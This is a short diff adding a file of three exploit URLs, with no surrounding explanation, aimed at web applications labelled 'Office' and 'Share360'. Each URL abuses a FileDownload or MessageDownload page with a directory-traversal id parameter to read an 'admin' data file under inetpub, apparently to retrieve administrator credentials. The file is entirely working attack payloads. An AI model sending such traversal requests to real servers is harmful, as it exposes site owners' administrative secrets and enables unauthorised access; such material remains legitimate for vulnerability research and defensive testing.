@@ -1,0 +1,10 @@
+Office:
+http://www.example.com/scripts/cbag/ag.exe?page=FileDownload&
+id=../../../../../../../../../../../../../inetpub/scripts/cbag/cb5/data/admin&notimecard=1&type=text&subtype=html&ct=1
+
+Share360:
+http://www.example.com/scripts/s360v2/s360.exe?page=FileDownload&
+id=../../../../../../../../../../inetpub/scripts/s360v2/s360v2/data/admin&type=text&subtype=plain&ct=1&.txt
+
+http://www.example.com/scripts/s360v2/s360.exe?page=MessageDownload&mid=37&
+id=../../../../../../../../../../inetpub/scripts/s360v2/s360v2/data/admin&bc=1&type=text&subtype=plain&ct=1&.txt 
